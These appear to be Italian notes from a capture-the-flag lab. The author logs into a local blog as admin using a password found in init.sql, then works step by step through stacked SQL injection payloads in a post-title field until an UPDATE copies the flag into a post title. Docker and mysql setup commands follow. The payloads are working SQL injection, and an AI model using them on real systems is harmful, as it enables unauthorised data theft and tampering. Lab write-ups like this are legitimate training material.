in init.sql possiamo vedere che admin ha come password adminpass



1) login come admin:adminpass  in localhost:8000
2) modifichiamo il titolo di un post
    se metto '; select 1; -- me lo fa fare
    quindi posso fare subquery

3) provo a creare un nuovo post
    '; INSERT INTO post (id, title, content) VALUES (1000, 'injected', 'works?'); --

4) funziona quindi proviamo a fare l'inject con la flag
    '; INSERT INTO post (id, title, content) VALUES (1000, (SELECT content FROM flag LIMIT 1 OFFSET 0), 'works?'); --

    NON VAAA

5) posso usare l'update però
    '; UPDATE post SET title = 'hellooooo' where id = '1';-- 

    FUNZIONA, proviamo injection di flag

6) flag injection 
    '; UPDATE post SET title = (SELECT content FROM flag LIMIT 1 OFFSET 0) where id = '1';--


    FUNZIONA, ora il post avrà come titolo la flag









(per aggiungere una flag sul db devo usare questi comandi:
#per vedere il nome del db    
sudo docker ps    

#per usare la shell sul processo 
sudo docker exec -it nome_db bash

#entra in mysql
mysql -u root -p

#password
example

#db
use blog;


#vedi tabelle
show tables;

#vedi colonne flga
describe flag;

#inserisci flag
INSERT INTO flag(id, content) values (1, 'flaaaaaaaggssgaa');

